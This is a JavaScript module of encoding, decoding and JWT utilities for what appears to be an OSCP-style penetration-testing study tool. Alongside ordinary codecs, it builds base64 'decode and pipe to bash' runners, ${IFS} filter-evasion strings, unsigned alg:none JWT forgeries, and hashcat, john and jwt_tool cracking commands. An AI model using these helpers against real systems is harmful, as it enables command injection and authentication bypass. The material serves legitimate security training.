/*!
 * obol engine, workbench.js
 * Pure, dependency-free logic for the Workbench: the "borrowed back ends" that obol runs entirely
 * client-side. No network, no execution, no state of its own. Everything here is a plain function or
 * a data table so it can be unit-tested under node and reused by the route UI.
 *
 * What lives here:
 *   - REVSHELLS: a curated reverse-shell catalogue (the common OSCP set), each a {{lhost}}/{{lport}}
 *     template with a plain-language note and a matching listener.
 *   - Encoders: UTF-8 base64, URL, hex, ROT13, and the OSCP favourite PowerShell -EncodedCommand
 *     (UTF-16LE then base64), plus a Linux "pipe to base64 -d" runner wrapper.
 * These ENRICH presentation only. They never touch the pack commands, the fact ledger, or the coach.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};
  var W = {};

  // ── byte / base64 primitives (work identically in the browser and in node) ──────────────────
  var B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

  function bytesToB64(bytes) {
    var out = '', i;
    for (i = 0; i + 2 < bytes.length; i += 3) {
      var n = (bytes[i] << 16) | (bytes[i + 1] << 8) | bytes[i + 2];
      out += B64[(n >> 18) & 63] + B64[(n >> 12) & 63] + B64[(n >> 6) & 63] + B64[n & 63];
    }
    var rem = bytes.length - i;
    if (rem === 1) { var a = bytes[i] << 16; out += B64[(a >> 18) & 63] + B64[(a >> 12) & 63] + '=='; }
    else if (rem === 2) { var b = (bytes[i] << 16) | (bytes[i + 1] << 8); out += B64[(b >> 18) & 63] + B64[(b >> 12) & 63] + B64[(b >> 6) & 63] + '='; }
    return out;
  }

  // String → UTF-8 byte array (handles surrogate pairs).
  function utf8Bytes(str) {
    str = String(str == null ? '' : str);
    var out = [];
    for (var i = 0; i < str.length; i++) {
      var c = str.charCodeAt(i);
      if (c < 0x80) { out.push(c); }
      else if (c < 0x800) { out.push(0xc0 | (c >> 6), 0x80 | (c & 0x3f)); }
      else if (c >= 0xd800 && c < 0xdc00 && i + 1 < str.length) {
        var c2 = str.charCodeAt(++i);
        var u = 0x10000 + ((c - 0xd800) << 10) + (c2 - 0xdc00);
        out.push(0xf0 | (u >> 18), 0x80 | ((u >> 12) & 0x3f), 0x80 | ((u >> 6) & 0x3f), 0x80 | (u & 0x3f));
      } else { out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 0x3f), 0x80 | (c & 0x3f)); }
    }
    return out;
  }

  // String → UTF-16LE byte array (what PowerShell -EncodedCommand expects).
  function utf16leBytes(str) {
    str = String(str == null ? '' : str);
    var out = [];
    for (var i = 0; i < str.length; i++) { var c = str.charCodeAt(i); out.push(c & 0xff, (c >> 8) & 0xff); }
    return out;
  }

  // ── encoders ────────────────────────────────────────────────────────────────────────────────
  W.b64 = function (str) { return bytesToB64(utf8Bytes(str)); };

  W.b64decode = function (b64) {
    b64 = String(b64 == null ? '' : b64).replace(/\s+/g, '');
    var bytes = [], buf = 0, bits = 0;
    for (var i = 0; i < b64.length; i++) {
      var ch = b64[i]; if (ch === '=') break;
      var v = B64.indexOf(ch); if (v < 0) continue;
      buf = (buf << 6) | v; bits += 6;
      if (bits >= 8) { bits -= 8; bytes.push((buf >> bits) & 0xff); }
    }
    // decode UTF-8 bytes back to a string
    var out = '', j = 0;
    while (j < bytes.length) {
      var b = bytes[j++];
      if (b < 0x80) { out += String.fromCharCode(b); }
      else if (b >= 0xc0 && b < 0xe0) { out += String.fromCharCode(((b & 0x1f) << 6) | (bytes[j++] & 0x3f)); }
      else if (b >= 0xe0 && b < 0xf0) { out += String.fromCharCode(((b & 0x0f) << 12) | ((bytes[j++] & 0x3f) << 6) | (bytes[j++] & 0x3f)); }
      else { var u = ((b & 0x07) << 18) | ((bytes[j++] & 0x3f) << 12) | ((bytes[j++] & 0x3f) << 6) | (bytes[j++] & 0x3f); u -= 0x10000; out += String.fromCharCode(0xd800 + (u >> 10), 0xdc00 + (u & 0x3ff)); }
    }
    return out;
  };

  // PowerShell -EncodedCommand payload: base64 of the UTF-16LE script bytes. OffSec teaches this to
  // sidestep quoting and bad characters on the command line.
  W.psEnc = function (script) { return bytesToB64(utf16leBytes(script)); };

  W.hexDecode = function (hex) {
    hex = String(hex == null ? '' : hex).replace(/\s+/g, '');
    if (!/^[0-9a-fA-F]*$/.test(hex) || hex.length % 2 !== 0) return null;
    var bytes = [];
    for (var i = 0; i < hex.length; i += 2) bytes.push(parseInt(hex.substr(i, 2), 16));
    var out = '', j = 0;
    while (j < bytes.length) {
      var b = bytes[j++];
      if (b < 0x80) out += String.fromCharCode(b);
      else if (b >= 0xc0 && b < 0xe0) out += String.fromCharCode(((b & 0x1f) << 6) | (bytes[j++] & 0x3f));
      else if (b >= 0xe0 && b < 0xf0) out += String.fromCharCode(((b & 0x0f) << 12) | ((bytes[j++] & 0x3f) << 6) | (bytes[j++] & 0x3f));
      else { var u = ((b & 0x07) << 18) | ((bytes[j++] & 0x3f) << 12) | ((bytes[j++] & 0x3f) << 6) | (bytes[j++] & 0x3f); u -= 0x10000; out += String.fromCharCode(0xd800 + (u >> 10), 0xdc00 + (u & 0x3ff)); }
    }
    return out;
  };
  W.urlDecode = function (str) { try { return decodeURIComponent(String(str == null ? '' : str).replace(/\+/g, ' ')); } catch (e) { return null; } };
  W.urlEnc = function (str) { return encodeURIComponent(String(str == null ? '' : str)); };
  W.urlEncAll = function (str) {
    // Encode EVERY byte (%NN), the aggressive form useful when a filter blocks specific characters.
    return utf8Bytes(str).map(function (b) { return '%' + ('0' + b.toString(16)).slice(-2).toUpperCase(); }).join('');
  };
  W.hexEnc = function (str) { return utf8Bytes(str).map(function (b) { return ('0' + b.toString(16)).slice(-2); }).join(''); };
  W.rot13 = function (str) {
    return String(str == null ? '' : str).replace(/[a-zA-Z]/g, function (c) {
      var base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode((c.charCodeAt(0) - base + 13) % 26 + base);
    });
  };
  // ${IFS} whitespace evasion: replace spaces with ${IFS} so a space-filtering filter still runs the
  // command. A teaching aid, shown beside a plain-language note about when it helps.
  W.ifsEvade = function (str) { return String(str == null ? '' : str).replace(/ /g, '${IFS}'); };

  // base64url (JWT) decode: the URL-safe alphabet, no padding.
  W.b64urlDecode = function (s) {
    s = String(s == null ? '' : s).replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    return W.b64decode(s);
  };

  // Decode (not verify) a JWT. Verification needs the secret/key, which obol never has; this is a reader,
  // and that distinction is the teaching point: a decoded token is not a trusted token.
  W.decodeJwt = function (token) {
    token = String(token == null ? '' : token).trim();
    var parts = token.split('.');
    if (parts.length < 2) return { ok: false, error: 'Not a JWT. A JWT has three parts separated by dots: header.payload.signature.' };
    function parseSeg(seg, which) {
      try { return { ok: true, obj: JSON.parse(W.b64urlDecode(seg)) }; }
      catch (e) { return { ok: false, error: 'The ' + which + ' is not valid base64url JSON.' }; }
    }
    var h = parseSeg(parts[0], 'header'), p = parseSeg(parts[1], 'payload');
    if (!h.ok) return { ok: false, error: h.error };
    if (!p.ok) return { ok: false, error: p.error };
    var alg = h.obj && h.obj.alg;
    var flags = [];
    if (alg && String(alg).toLowerCase() === 'none') flags.push('alg is "none": if the server honours it, the signature is not checked at all. Try sending the token with an empty signature.');
    if (alg && /^hs/i.test(String(alg))) flags.push('alg is HMAC (' + alg + '): the signature uses a shared secret. If that secret is weak, it can be brute-forced offline (hashcat -m 16500), then you can forge any token.');
    if (alg && /^rs/i.test(String(alg))) flags.push('alg is RSA (' + alg + '): signed with a private key. Watch for an algorithm-confusion trick (RS256 to HS256 using the public key as the HMAC secret).');
    return {
      ok: true, header: h.obj, payload: p.obj, signature: parts[2] || '', alg: alg || null,
      flags: flags, hasSig: !!(parts[2] && parts[2].length),
    };
  };

  // Pure-JS SHA-256 + HMAC-SHA256 so JWT HS256 signing works synchronously in browser (even on file://) and in Node.
  var _SHA256_K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
  ];
  function _rotr(n, x) { return (x >>> n) | (x << (32 - n)); }
  function sha256Bytes(msgBytes) {
    var l = msgBytes.length, bitLenHi = Math.floor((l * 8) / 0x100000000), bitLenLo = (l * 8) >>> 0;
    var padLen = ((l + 9 + 63) & ~63);
    var m = new Uint8Array(padLen);
    for (var i = 0; i < l; i++) m[i] = msgBytes[i];
    m[l] = 0x80;
    m[padLen - 8] = (bitLenHi >>> 24) & 0xff; m[padLen - 7] = (bitLenHi >>> 16) & 0xff;
    m[padLen - 6] = (bitLenHi >>> 8) & 0xff;  m[padLen - 5] = bitLenHi & 0xff;
    m[padLen - 4] = (bitLenLo >>> 24) & 0xff; m[padLen - 3] = (bitLenLo >>> 16) & 0xff;
    m[padLen - 2] = (bitLenLo >>> 8) & 0xff;  m[padLen - 1] = bitLenLo & 0xff;
    var H0 = 0x6a09e667, H1 = 0xbb67ae85, H2 = 0x3c6ef372, H3 = 0xa54ff53a;
    var H4 = 0x510e527f, H5 = 0x9b05688c, H6 = 0x1f83d9ab, H7 = 0x5be0cd19;
    var W32 = new Uint32Array(64);
    for (var off = 0; off < padLen; off += 64) {
      for (var t = 0; t < 16; t++) {
        var j = off + t * 4;
        W32[t] = ((m[j] << 24) | (m[j + 1] << 16) | (m[j + 2] << 8) | m[j + 3]) >>> 0;
      }
      for (var t2 = 16; t2 < 64; t2++) {
        var s0 = _rotr(7, W32[t2 - 15]) ^ _rotr(18, W32[t2 - 15]) ^ (W32[t2 - 15] >>> 3);
        var s1 = _rotr(17, W32[t2 - 2]) ^ _rotr(19, W32[t2 - 2]) ^ (W32[t2 - 2] >>> 10);
        W32[t2] = (W32[t2 - 16] + s0 + W32[t2 - 7] + s1) >>> 0;
      }
      var a = H0, b = H1, c = H2, d = H3, e = H4, f = H5, g = H6, h = H7;
      for (var r = 0; r < 64; r++) {
        var S1 = _rotr(6, e) ^ _rotr(11, e) ^ _rotr(25, e);
        var ch = (e & f) ^ ((~e) & g);
        var temp1 = (h + S1 + ch + _SHA256_K[r] + W32[r]) >>> 0;
        var S0 = _rotr(2, a) ^ _rotr(13, a) ^ _rotr(22, a);
        var maj = (a & b) ^ (a & c) ^ (b & c);
        var temp2 = (S0 + maj) >>> 0;
        h = g; g = f; f = e; e = (d + temp1) >>> 0;
        d = c; c = b; b = a; a = (temp1 + temp2) >>> 0;
      }
      H0 = (H0 + a) >>> 0; H1 = (H1 + b) >>> 0; H2 = (H2 + c) >>> 0; H3 = (H3 + d) >>> 0;
      H4 = (H4 + e) >>> 0; H5 = (H5 + f) >>> 0; H6 = (H6 + g) >>> 0; H7 = (H7 + h) >>> 0;
    }
    var out = [];
    [H0, H1, H2, H3, H4, H5, H6, H7].forEach(function (w) {
      out.push((w >>> 24) & 0xff, (w >>> 16) & 0xff, (w >>> 8) & 0xff, w & 0xff);
    });
    return out;
  }
  function hmacSha256Bytes(keyStr, msgStr) {
    var k = utf8Bytes(String(keyStr == null ? '' : keyStr));
    if (k.length > 64) k = sha256Bytes(k);
    var ipad = [], opad = [];
    for (var i = 0; i < 64; i++) {
      var kb = i < k.length ? k[i] : 0;
      ipad.push(kb ^ 0x36);
      opad.push(kb ^ 0x5c);
    }
    var inner = sha256Bytes(ipad.concat(utf8Bytes(String(msgStr == null ? '' : msgStr))));
    return sha256Bytes(opad.concat(inner));
  }
  W.b64urlEncode = function (str) {
    return bytesToB64(utf8Bytes(str)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  };
  W.hmacSha256B64Url = function (secret, signingInput) {
    return bytesToB64(hmacSha256Bytes(secret, signingInput)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  };
  W.forgeJwtNone = function (headerOrPayload, payloadObj, algVariant) {
    var h, p;
    if (payloadObj === undefined) {
      h = { alg: 'none', typ: 'JWT' };
      p = Object.assign({}, headerOrPayload || {});
    } else {
      h = Object.assign({}, headerOrPayload || { typ: 'JWT' }, { alg: algVariant || 'none' });
      p = Object.assign({}, payloadObj || {});
    }
    return W.b64urlEncode(JSON.stringify(h)) + '.' + W.b64urlEncode(JSON.stringify(p)) + '.';
  };
  W.signJwtHs256 = function (headerObj, payloadObj, secret) {
    var h = Object.assign({}, headerObj || { typ: 'JWT' }, { alg: 'HS256' });
    var p = Object.assign({}, payloadObj || {});
    var signingInput = W.b64urlEncode(JSON.stringify(h)) + '.' + W.b64urlEncode(JSON.stringify(p));
    var sig = W.hmacSha256B64Url(secret == null ? '' : String(secret), signingInput);
    return signingInput + '.' + sig;
  };
  W.jwtAttackCmds = function (token) {
    var tok = String(token || '<JWT>').trim();
    return [
      { label: 'Crack HMAC Secret with Hashcat (Mode 16500)', locus: 'kali$', cmd: "echo '" + tok.replace(/'/g, "'\\''") + "' > jwt.txt && hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt" },
      { label: 'Crack HMAC Secret with John the Ripper', locus: 'kali$', cmd: "echo '" + tok.replace(/'/g, "'\\''") + "' > jwt.txt && john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt" },
      { label: 'Test All Known Exploits (alg:none, null sig, key confusion) via jwt_tool', locus: 'kali$', cmd: 'jwt_tool ' + tok + ' -M at' },
    ];
  };

  // A Linux one-liner that decodes and runs a base64 payload. OffSec teaches base64-wrapping a reverse
  // shell so a tricky character set (quotes, &, redirects) survives being pasted into a target field.
  W.linuxB64Runner = function (cmd, shellBin) {
    shellBin = shellBin || 'bash';
    return 'echo ' + W.b64(cmd) + ' | base64 -d | ' + shellBin;
  };

  // ── universal codecs + the Smart Decoder ─────────────────────────────────────────────────────
  // A BYTE-oriented codec layer so a stacked chain like base64 -> gzip -> text decodes to completion
  // without corrupting binary between layers. Each codec declares: encode(text)->string (the reversible
  // text transforms), decode(bytes)->bytes|Promise, and applies(bytes)->bool (a guard so the recursive
  // decoder only tries a codec when the input plausibly IS that format). `stack:true` opts a codec into the
  // automatic multi-layer search; single-layer obfuscations (ROT, reverse) are show-all + manual only.
  // Everything here is browser-native and deterministic: no backend, no key, no LLM. A decode is a decode,
  // never a claim that the result is trusted or complete.
  function toU8(x) { return (x instanceof Uint8Array) ? x : Uint8Array.from(utf8Bytes(x)); }
  function u8Ascii(bytes) { var s = ''; for (var i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]); return s; } // latin1 view
  var _TD = (typeof TextDecoder !== 'undefined') ? new TextDecoder('utf-8', { fatal: false }) : null;
  function u8Text(bytes) { return _TD ? _TD.decode(bytes) : u8Ascii(bytes); }
  function printableRatio(bytes) {
    if (!bytes.length) return 0;
    var ok = 0;
    for (var i = 0; i < bytes.length; i++) { var b = bytes[i]; if (b === 9 || b === 10 || b === 13 || (b >= 32 && b <= 126)) ok++; }
    return ok / bytes.length;
  }

  // base32 (RFC 4648)
  var B32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  function b32encode(bytes) {
    var out = '', buf = 0, bits = 0, i;
    for (i = 0; i < bytes.length; i++) { buf = (buf * 256) + bytes[i]; bits += 8; while (bits >= 5) { bits -= 5; out += B32[Math.floor(buf / Math.pow(2, bits)) & 31]; buf = buf % Math.pow(2, bits); } }
    if (bits > 0) out += B32[(buf * Math.pow(2, 5 - bits)) & 31];
    while (out.length % 8) out += '=';
    return out;
  }
  function b32decode(str) {
    str = String(str).replace(/=+$/, '').replace(/\s+/g, '').toUpperCase();
    var buf = 0, bits = 0, out = [], i, v;
    for (i = 0; i < str.length; i++) { v = B32.indexOf(str[i]); if (v < 0) return null; buf = (buf * 32) + v; bits += 5; if (bits >= 8) { bits -= 8; out.push(Math.floor(buf / Math.pow(2, bits)) & 0xff); buf = buf % Math.pow(2, bits); } }
    return Uint8Array.from(out);
  }

  // ascii85 / base85 (standard, with optional <~ ~> wrapper)
  function a85encode(bytes) {
    var out = '', i, j;
    for (i = 0; i < bytes.length; i += 4) {
      var len = Math.min(4, bytes.length - i), n = 0;
      for (j = 0; j < 4; j++) n = (n * 256) + (j < len ? bytes[i + j] : 0);
      if (len === 4 && n === 0) { out += 'z'; continue; }
      var chars = [];
      for (j = 0; j < 5; j++) { chars.unshift(String.fromCharCode(33 + (n % 85))); n = Math.floor(n / 85); }
      out += chars.slice(0, len + 1).join('');
    }
    return out;
  }
  function a85decode(str) {
    str = String(str).replace(/^<~/, '').replace(/~>\s*$/, '').replace(/\s+/g, '');
    var out = [], i, tuple = 0, count = 0, c, v, p, q;
    for (i = 0; i < str.length; i++) {
      c = str[i];
      if (c === 'z' && count === 0) { out.push(0, 0, 0, 0); continue; }
      v = c.charCodeAt(0) - 33; if (v < 0 || v > 84) return null;
      tuple = tuple * 85 + v; count++;
      if (count === 5) { if (tuple > 0xffffffff) return null; out.push((Math.floor(tuple / 16777216)) & 0xff, (Math.floor(tuple / 65536)) & 0xff, (Math.floor(tuple / 256)) & 0xff, tuple & 0xff); tuple = 0; count = 0; }
    }
    if (count > 0) { for (p = count; p < 5; p++) tuple = tuple * 85 + 84; if (tuple > 0xffffffff) return null; for (q = 0; q < count - 1; q++) out.push((Math.floor(tuple / Math.pow(256, 3 - q))) & 0xff); }
    return Uint8Array.from(out);
  }

  // HTML entities
  var _HTML_NAMED = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: ' ' };
  function htmlEncode(str) { return String(str).replace(/[&<>"']/g, function (c) { return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]; }); }
  function htmlDecode(str) {
    return String(str).replace(/&#x([0-9a-fA-F]+);/g, function (_, h) { return String.fromCodePoint(parseInt(h, 16)); })
      .replace(/&#(\d+);/g, function (_, d) { return String.fromCodePoint(parseInt(d, 10)); })
      .replace(/&([a-zA-Z]+);/g, function (m, n) { return _HTML_NAMED[n.toLowerCase()] != null ? _HTML_NAMED[n.toLowerCase()] : m; });
  }

  // binary (8-bit, space-grouped) + decimal char codes
  function binEncode(bytes) { var out = []; for (var i = 0; i < bytes.length; i++) out.push(('0000000' + bytes[i].toString(2)).slice(-8)); return out.join(' '); }
  function binDecode(str) { var bits = String(str).replace(/[^01]/g, ''); if (!bits.length || bits.length % 8) return null; var out = []; for (var i = 0; i < bits.length; i += 8) out.push(parseInt(bits.substr(i, 8), 2)); return Uint8Array.from(out); }
  function decDecode(str) { var ns = String(str).trim().split(/[\s,]+/).filter(Boolean); if (!ns.length) return null; var out = []; for (var i = 0; i < ns.length; i++) { if (!/^\d{1,3}$/.test(ns[i])) return null; var n = parseInt(ns[i], 10); if (n > 255) return null; out.push(n); } return Uint8Array.from(out); }

  // base64url
  function b64urlEnc(str) { return bytesToB64(utf8Bytes(str)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); }
  function rot47(str) { return String(str).replace(/[\x21-\x7e]/g, function (c) { return String.fromCharCode(33 + ((c.charCodeAt(0) - 33 + 47) % 94)); }); }

  // compression via the native (W3C) streams, feature-detected so the engine stays portable
  var _HAS_STREAMS = (typeof DecompressionStream !== 'undefined' && typeof ReadableStream !== 'undefined' && typeof Response !== 'undefined');
  function streamThrough(bytes, transform) {
    var rs = new ReadableStream({ start: function (c) { c.enqueue(bytes); c.close(); } });
    return new Response(rs.pipeThrough(transform)).arrayBuffer().then(function (buf) { return new Uint8Array(buf); });
  }
  function inflate(bytes, fmt) { if (!_HAS_STREAMS) return Promise.resolve(null); return streamThrough(bytes, new DecompressionStream(fmt)).catch(function () { return null; }); }
  // Manual decode is base64-wrapper tolerant: the encoders emit base64 (so the blob is pasteable), and a
  // learner will paste that straight back. If the bytes are not already a raw stream for this format, try
  // base64-decoding them first, then inflate. Returns null only when neither the raw nor the unwrapped form
  // decompresses, so the manual field reports an honest "not valid".
  function inflateFlexible(bytes, fmt) {
    if (!_HAS_STREAMS) return Promise.resolve(null);
    return inflate(bytes, fmt).then(function (r) {
      if (r && r.length) return r;
      var unwrapped = b64toBytes(u8Ascii(bytes));
      if (!unwrapped || !unwrapped.length) return null;
      return inflate(unwrapped, fmt);
    });
  }
  function deflate(text, fmt) { if (!_HAS_STREAMS) return Promise.resolve(null); return streamThrough(toU8(text), new CompressionStream(fmt)).then(function (b) { return bytesToB64(Array.prototype.slice.call(b)); }).catch(function () { return null; }); }

  // base64 raw bytes (not utf8-decoded) from an ascii base64 string
  function b64toBytes(s) {
    s = String(s).replace(/\s+/g, '').replace(/-/g, '+').replace(/_/g, '/');
    var out = [], buf = 0, bits = 0;
    for (var i = 0; i < s.length; i++) { var ch = s[i]; if (ch === '=') break; var v = B64.indexOf(ch); if (v < 0) return null; buf = (buf << 6) | v; bits += 6; if (bits >= 8) { bits -= 8; out.push((buf >> bits) & 0xff); } }
    return Uint8Array.from(out);
  }
  function hexToBytes(s) { s = String(s).replace(/\s+/g, ''); if (!/^[0-9a-fA-F]*$/.test(s) || s.length % 2) return null; var out = []; for (var i = 0; i < s.length; i += 2) out.push(parseInt(s.substr(i, 2), 16)); return Uint8Array.from(out); }

  // The registry. applies() gates the AUTO search; it reads the latin1 view of the bytes.
  function _a(bytes) { return u8Ascii(bytes); }
  function utf16leDecodeBytes(raw) {
    if (!raw || raw.length < 4 || raw.length % 2 !== 0) return null;
    var oddZeros = 0, pairs = raw.length / 2, out = [];
    for (var i = 0; i < raw.length; i += 2) {
      if (raw[i + 1] === 0 && (raw[i] === 9 || raw[i] === 10 || raw[i] === 13 || (raw[i] >= 32 && raw[i] <= 126))) oddZeros++;
      out.push(raw[i]);
    }
    if (oddZeros / pairs < 0.75) return null;
    return Uint8Array.from(out);
  }

  var CODECS = [
    { id: 'base64', label: 'Base64', note: 'The everyday encoding. The OSCP base64-then-decode trick lives here.', stack: true,
      encode: function (t) { return W.b64(t); }, decode: function (b) { return b64toBytes(_a(b)); },
      applies: function (b) {
        var s = _a(b).replace(/\s+/g, '');
        if (!/^[A-Za-z0-9+/]+={0,2}$/.test(s) || s.length < 4 || s.length % 4 !== 0) return false;
        if (/^[a-zA-Z]+$/.test(s) && !/(?:[A-Z].*[a-z].*[A-Z]|[a-z].*[A-Z])/.test(s)) return false;
        var dec = b64toBytes(s);
        if (!dec || !dec.length) return false;
        if (dec.length > 2 && ((dec[0] === 0x1f && dec[1] === 0x8b) || (dec[0] === 0x78 && [0x01, 0x5e, 0x9c, 0xda].indexOf(dec[1]) >= 0))) return true;
        return printableRatio(dec) >= 0.85;
      } },
    { id: 'psenc', label: 'PowerShell -enc (UTF-16LE Base64)', note: 'Windows PowerShell -EncodedCommand format (UTF-16LE bytes then Base64).', stack: true,
      encode: function (t) { return W.psEnc(t); },
      decode: function (b) { return utf16leDecodeBytes(b64toBytes(_a(b))); },
      applies: function (b) {
        var s = _a(b).replace(/\s+/g, '');
        if (!/^[A-Za-z0-9+/]+={0,2}$/.test(s) || s.length < 8 || s.length % 4 !== 0) return false;
        return !!utf16leDecodeBytes(b64toBytes(s));
      } },
    { id: 'base64url', label: 'Base64 URL', note: 'URL-safe base64 (-_ instead of +/, no padding). JWT segments use this.', stack: true,
      encode: b64urlEnc, decode: function (b) { return b64toBytes(_a(b)); },
      applies: function (b) {
        var s = _a(b).replace(/\s+/g, '');
        if (!/^[A-Za-z0-9_-]+$/.test(s) || s.length < 4 || !/[-_]/.test(s)) return false;
        var dec = b64toBytes(s);
        return !!(dec && dec.length && printableRatio(dec) >= 0.85);
      } },
    { id: 'hex', label: 'Hex', note: 'Raw bytes as hexadecimal.', stack: true,
      encode: function (t) { return W.hexEnc(t); }, decode: function (b) { return hexToBytes(_a(b)); },
      applies: function (b) { var s = _a(b).replace(/\s+/g, ''); return /^[0-9a-fA-F]+$/.test(s) && s.length >= 4 && s.length % 2 === 0; } },
    { id: 'url', label: 'URL (percent)', note: 'Percent-encode the characters a URL would choke on.', stack: true,
      encode: function (t) { return W.urlEnc(t); }, decode: function (b) { try { return toU8(decodeURIComponent(_a(b).replace(/\+/g, ' '))); } catch (e) { return null; } },
      applies: function (b) { return /%[0-9a-fA-F]{2}/.test(_a(b)); } },
    { id: 'url-all', label: 'URL (every byte)', note: 'Aggressive: percent-encode every byte. Useful when a filter blocks specific characters.',
      encode: function (t) { return W.urlEncAll(t); } },
    { id: 'base32', label: 'Base32', note: 'RFC 4648 base32 (A-Z, 2-7).', stack: true,
      encode: function (t) { return b32encode(utf8Bytes(t)); }, decode: function (b) { return b32decode(_a(b)); },
      applies: function (b) { var s = _a(b).replace(/\s+/g, '').replace(/=+$/, ''); return /^[A-Za-z2-7]+$/.test(s) && s.length >= 8 && (s.length % 8 === 0 || _a(b).indexOf('=') >= 0); } },
    { id: 'ascii85', label: 'Ascii85 / Base85', note: 'Adobe/standard base85. The <~ ~> wrapper is optional.', stack: true,
      encode: function (t) { return a85encode(utf8Bytes(t)); }, decode: function (b) { return a85decode(_a(b)); },
      applies: function (b) { return /^<~[\s\S]*~>\s*$/.test(_a(b)); } },
    { id: 'binary', label: 'Binary (8-bit)', note: 'Each byte as eight bits.', stack: true,
      encode: function (t) { return binEncode(utf8Bytes(t)); }, decode: function (b) { return binDecode(_a(b)); },
      applies: function (b) { var s = _a(b).replace(/[^01]/g, ''); return /^[01\s]+$/.test(_a(b)) && s.length >= 16 && s.length % 8 === 0; } },
    { id: 'decimal', label: 'Decimal char codes', note: 'Each byte as a decimal number (0-255).', stack: true,
      encode: function (t) { return utf8Bytes(t).join(' '); }, decode: function (b) { return decDecode(_a(b)); },
      applies: function (b) { return /^\d{1,3}([\s,]+\d{1,3})+$/.test(_a(b).trim()); } },
    { id: 'html', label: 'HTML entities', note: 'Named and numeric HTML entities (&amp; &#x41; &#65;).', stack: true,
      encode: function (t) { return htmlEncode(t); }, decode: function (b) { var s = _a(b), d = htmlDecode(s); return d === s ? null : toU8(d); },
      applies: function (b) { return /&(#x?[0-9a-fA-F]+|[a-zA-Z]+);/.test(_a(b)); } },
    { id: 'gzip', label: 'Gzip (base64)', note: 'gzip-compressed, shown base64-wrapped so it is pasteable. Decodes a gzip stream to completion.',
      encode: function (t) { return deflate(t, 'gzip'); }, decode: function (b) { return inflateFlexible(b, 'gzip'); },
      applies: function (b) { return b.length > 2 && b[0] === 0x1f && b[1] === 0x8b; }, stack: true },
    { id: 'zlib', label: 'Zlib (base64)', note: 'zlib/deflate stream, base64-wrapped on encode.',
      encode: function (t) { return deflate(t, 'deflate'); }, decode: function (b) { return inflateFlexible(b, 'deflate'); },
      applies: function (b) { return b.length > 2 && b[0] === 0x78 && [0x01, 0x5e, 0x9c, 0xda].indexOf(b[1]) >= 0; }, stack: true },
    { id: 'deflate-raw', label: 'Raw deflate', note: 'Headerless deflate. Manual only (no magic bytes to detect it safely).',
      encode: function (t) { return deflate(t, 'deflate-raw'); }, decode: function (b) { return inflateFlexible(b, 'deflate-raw'); } },
    { id: 'rot13', label: 'ROT13', note: 'Rotate letters by 13. Obfuscation, not encryption. Self-inverse.',
      encode: function (t) { return W.rot13(t); }, decode: function (b) { return toU8(W.rot13(u8Text(b))); } },
    { id: 'rot47', label: 'ROT47', note: 'Rotate printable ASCII by 47. Self-inverse.',
      encode: function (t) { return rot47(t); }, decode: function (b) { return toU8(rot47(u8Text(b))); } },
    { id: 'reverse', label: 'Reverse', note: 'Reverse the string. Self-inverse.',
      encode: function (t) { return String(t).split('').reverse().join(''); }, decode: function (b) { return toU8(u8Text(b).split('').reverse().join('')); } },
  ];
  var AUTO = CODECS.filter(function (c) { return c.stack && c.decode && c.applies; });
  function codecById(id) { for (var i = 0; i < CODECS.length; i++) if (CODECS[i].id === id) return CODECS[i]; return null; }
  W.CODECS = CODECS;
  W.codecList = function () { return CODECS.map(function (c) { return { id: c.id, label: c.label, note: c.note, enc: !!c.encode, dec: !!c.decode }; }); };

  // Unwrap common shell wrappers (e.g. "echo <B64> | base64 -d | bash" or "powershell ... -enc <B64>")
  // so pasting a wrapped command into Decode still peels the inner payload cleanly.
  W.unwrapShellWrapper = function (raw) {
    var s = String(raw == null ? '' : raw).trim();
    var mEcho = s.match(/^(?:echo|\{echo,)[\s,]+['"]?([A-Za-z0-9+/=_-]{4,})['"]?\}?\s*\|\s*base64/i);
    if (mEcho) return { unwrapped: true, label: 'Linux base64 wrapper', payload: mEcho[1] };
    var mPs = s.match(/powershell(?:\.exe)?\b[^\r\n]*?\s-(?:e|en|enc|enco|encoded|encodedcommand)\s+['"]?([A-Za-z0-9+/=]{8,})['"]?/i);
    if (mPs) return { unwrapped: true, label: 'PowerShell -enc wrapper', payload: mPs[1] };
    return { unwrapped: false, label: '', payload: s };
  };

  // How "decoded" a byte string looks: printable ratio + structure/marker bonuses, minus penalties for
  // strings that still look like raw encodings (hex, base64, percent-encoded, binary, decimal).
